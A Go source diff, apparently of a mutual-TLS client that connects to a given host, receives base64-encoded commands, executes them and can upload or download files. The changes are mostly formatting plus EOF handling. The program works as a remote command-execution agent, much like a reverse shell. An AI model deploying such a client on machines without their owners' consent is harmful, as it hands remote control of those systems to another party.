@@ -21,6 +21,7 @@ func handleError(err error) {
 		log.Fatal(err)
 	}
 }
+
 // file upl /downl functions, if needed
 func uploadFile(conn *tls.Conn, path string) {
 	// open file to upload
@@ -45,7 +46,7 @@ func downloadFile(conn *tls.Conn, path string) {
 	handleError(err)
 }
 
-func execInput(input string) string{
+func execInput(input string) string {
 	// Remove the newline character.
 	input = strings.TrimSuffix(input, "\n")
 
@@ -82,7 +83,7 @@ func setWriteDeadLine(conn *tls.Conn) {
 
 func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
 	reDial := 0
-	for  ok := true; ok; ok = reDial <5{
+	for ok := true; ok; ok = reDial < 5 {
 		conn, err := tls.Dial("tcp", serviceID, config)
 		reDial++
 		if err != nil {
@@ -101,7 +102,7 @@ func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
 		log.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)
 		return conn
 
-	} 
+	}
 	fmt.Println("Could not reach server. Exiting....")
 	os.Exit(1)
 	return nil //will never reach this
@@ -118,7 +119,7 @@ func main() {
 		fmt.Println("Please provide host:port")
 		return
 	}
-	
+
 	genCert(os.Getenv("SSLCERTGENEMAIL_CLIENT"))
 	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
 	if err != nil {
@@ -134,9 +135,13 @@ func main() {
 		setReadDeadLine(conn)
 		_, err := conn.Read(buffer)
 		if err != nil {
-			fmt.Println("Read Error. Exiting.")
-			return
+			fmt.Println("Read Error. Checking status.")
+			if err == io.EOF {
+				fmt.Println("All commands ran successfully. Returning exit success.")
+				os.Exit(0)
+			}
 		}
+
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		//fmt.Println("$ " + string(sDec))
 		resp := execInput(string(sDec))
